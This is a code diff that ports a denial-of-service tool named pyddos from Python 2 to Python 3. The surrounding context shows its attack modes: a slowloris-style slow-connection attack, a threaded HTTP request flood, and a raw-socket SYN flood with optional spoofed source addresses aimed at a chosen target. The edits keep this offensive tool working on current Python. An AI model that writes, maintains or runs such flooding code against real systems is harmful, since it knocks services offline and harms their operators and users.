@@ -1,6 +1,6 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
-version= '2.0'
+version= '3.0'
 title = '''
 
       _ \        __ \  __ \               ___|           _)       |   
@@ -21,7 +21,7 @@ import json
 import time
 import string
 import signal
-import httplib,urlparse
+import  http.client,urllib.parse
 from random import *
 from socket import *
 from struct import *
@@ -35,7 +35,7 @@ if os.name == 'posix':
 	else:
 		pass
 else:
-	print '[-] Check your pip installer'
+	print ('[-] Check your pip installer')
 
 try:
 	import requests,colorama
@@ -50,8 +50,8 @@ except:
 			sys.exit('[+] I have installed nessecary modules for you')
 		else:
 			sys.exit('[-] Download and install nessecary modules')
-	except Exception,e:
-		print '[-]',e
+	except Exception as e:
+		print ('[-]',e)
 if os.name == 'nt':
 	colorama.init()
 
@@ -190,7 +190,7 @@ class Pyslow:
 			except KeyboardInterrupt:
 				break
 				sys.exit(cprint('[-] Canceled by user','red'))
-		print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
+		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
 		time.sleep(self.sleep)
 
 class Requester(Thread):
@@ -252,8 +252,8 @@ class Requester(Thread):
 				reqter.request(method.upper(),url,None,http_header)
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user','red'))
-		except Exception,e:
-			print e
+		except Exception as e:
+			print (e)
 		finally:
 			self.closeConnections()
 	def closeConnections(self):
@@ -343,7 +343,7 @@ class Synflood(Thread):
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user','red'))
-		except Exception,e:
+		except Exception as e:
 			cprint(e,'red')
 		finally:
 			self.lock.release()
@@ -351,7 +351,6 @@ class Synflood(Thread):
 def main():
 	parser = ArgumentParser(
         usage='./%(prog)s -t [target] -p [port] -t [number threads]',
-        version=version,
         formatter_class=RawTextHelpFormatter,
         prog='pyddos',
         description=cprint(title,'white',attrs=['bold']),
@@ -392,7 +391,7 @@ Example:
 		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
 		ts=[]
 		threads=[]
-		print colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red')
+		print (colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red'))
 		while 1:
 			if args.i == False:
 				args.fakeip = True
@@ -411,7 +410,7 @@ Example:
 	elif args.Request:
 		tgt = args.d
 		threads = []
-		print colored('[*] Start send request to: ','blue')+colored(tgt,'red')
+		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
 				for x in xrange(int(args.T)):
@@ -428,8 +427,8 @@ Example:
 			to = float(args.t)
 			st = int(args.s)
 			threads = int(args.T)
-		except Exception,e:
-			print '[-]',e
+		except Exception as e:
+			print ('[-]',e)
 		while 1:
 			try:
 				worker=Pyslow(tgt,port,to,threads,st)
